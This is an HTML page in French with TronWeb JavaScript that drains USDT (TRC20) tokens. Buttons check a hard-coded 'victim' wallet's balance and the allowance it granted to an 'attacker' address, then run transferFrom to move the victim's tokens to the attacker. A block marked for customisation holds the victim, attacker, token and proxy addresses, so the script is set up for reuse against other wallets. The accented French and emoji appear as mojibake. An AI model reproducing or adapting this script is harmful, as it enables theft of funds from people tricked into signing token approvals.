<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Test TRC20 - V√©rifications & transferFrom</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
</head>
<body>
  <h2>üß™ V√©rification des autorisations USDT TRC20</h2>

  <!-- Boutons -->
  <button onclick="checkBalance()">1Ô∏è‚É£ V√©rifier solde USDT de la victime</button>
  <button onclick="checkAllowance()">2Ô∏è‚É£ V√©rifier autorisation donn√©e</button>
  <button onclick="runTransferFrom()">3Ô∏è‚É£ Ex√©cuter transferFrom</button>

  <!-- Zone de retour -->
  <pre id="output"></pre>

  <script>
    // --- üîß √Ä PERSONNALISER ---
    const victim = "TB21PeujGEM51zg9CnSpop6EaqZ6ccKx3T"; // adresse de la victime
    const attacker = "THRU2XfxP5vbUm6RPDpo3K7B12JVvYMD41"; // adresse receveuse
    const tokenAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC20
    const proxyAddress = "TAo4rwUGQovSD9F3qSeecUAsJsyzLetWpH"; // contrat qui a re√ßu l'approbation
    const amount = 1 * 1_000_000; // 1 USDT (en sun)

    // Affichage
    const output = document.getElementById("output");

    function log(message) {
      console.log(message);
      output.textContent += message + "\n";
    }

    async function getTokenContract() {
      if (!window.tronWeb || !window.tronWeb.ready) {
        alert("Connecte-toi √† TronLink !");
        throw new Error("TronLink non connect√©");
      }
      return await window.tronWeb.contract().at(tokenAddress);
    }

    async function checkBalance() {
      try {
        const contract = await getTokenContract();
        const balance = await contract.balanceOf(victim).call();
        log(`üí∞ Solde de la victime : ${balance / 1_000_000} USDT`);
      } catch (e) {
        log("‚ùå Erreur balance : " + e.message);
      }
    }

    async function checkAllowance() {
      try {
        const contract = await getTokenContract();
        const allowance = await contract.allowance(victim, attacker).call();
        log(`üîê Autorisation donn√©e √† ${attacker} : ${allowance / 1_000_000} USDT`);
      } catch (e) {
        log("‚ùå Erreur allowance : " + e.message);
      }
    }

    async function runTransferFrom() {
      try {
        const contract = await getTokenContract();
        const tx = await contract.transferFrom(victim, attacker, amount).send({
          feeLimit: 1_000_000,
        });
        log(`üöÄ transferFrom envoy√© ! txID : ${tx}`);
      } catch (e) {
        log("‚ùå Erreur transferFrom : " + e.message);
      }
    }
  </script>
</body>
</html>
